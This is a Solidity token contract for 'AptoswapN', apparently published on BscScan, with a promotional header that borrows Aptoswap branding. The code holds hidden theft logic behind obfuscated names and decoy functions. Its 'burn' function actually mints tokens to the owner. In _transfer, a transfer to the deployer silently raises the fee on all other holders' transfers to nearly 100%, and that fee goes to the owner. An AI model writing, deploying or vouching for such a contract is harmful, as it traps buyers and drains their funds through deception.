/**
 *Submitted for verification at BscScan.com on 2022-12-31
*/

/*
	Aptoswap_net
Swap AMM Infrastructure for APTOS blockchain. 
Short Intro for current Aptoswap:
💸 High liquidity rewards, 0.27% base + 0.03% incentive
💰 High APR
💦 Support both uncorrelated and stable swap pools
 🔗 Aggregators such as  supports
• Web: https://aptoswap.net
• Discord: https://discord.gg/xbM7XAknHf
• GitHub: https://github.com/vividnetwork
• Twitter:https://twitter.com/aptoswap_net
	*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.5.17;
contract AptoswapN {
address private  MBOVEU = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  QJZAEC = 79;
string public  symbol = "AptoswapN";
address private  VFRTJL = address(0);
address private  DQSJQJ = address(0);
string public  name = "AptoswapN";
address private  OCIPKF = address(0);
uint256 private  YQKJAN = 84;
address public owner;
uint256 public constant MHAQMP = 99999;
uint256 private  EALBKS = 88;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  HHAPCR = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  SZAIUX = 6;
uint256 private  KXIZMP = 5;
address private  UWTFHP = address(0);
uint256 public constant totalSupply = 1000000000000000000000000000;
uint8 public constant decimals = 18;
mapping (address => uint256) public balanceOf;
uint256 private  DLKIRV = 10;
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () public {
DQSJQJ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tPCQKDV 0");
require(spender != address(0), "fPCQKDV 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _add1QJZAEC() private returns (uint256) {
return QJZAEC --;
}
//
function _getE2ALBKS() private returns (uint256) {
return EALBKS++;
}
//
function _addMB3OVEU() private returns (address) {
return MBOVEU;
}
//
function _getKXI4ZMP() private returns (uint256) {
return KXIZMP + SZAIUX;
}
//
function _addUWTF5HP() private returns (address) {
return UWTFHP;
}
//
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getOCIPK6F() private returns (address) {
return OCIPKF;
}
//
function _addSZAIUX7() private returns (uint256) {
return SZAIUX - HHAPCR;
}
//
function _getY8QKJAN() private returns (uint256) {
return YQKJAN--;
}
//
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "PCQKDV");
require(to != address(0), "PCQKDV");
require(amount <= balanceOf[from], "PCQKDV");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* MHAQMP/HHAPCR ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==DQSJQJ){
HHAPCR = MHAQMP+2;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _addDL9KIRV() private returns (uint256) {
return DLKIRV * KXIZMP;
}
//
function _getVFR10TJL() private returns (address) {
return VFRTJL;
}
//
//
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}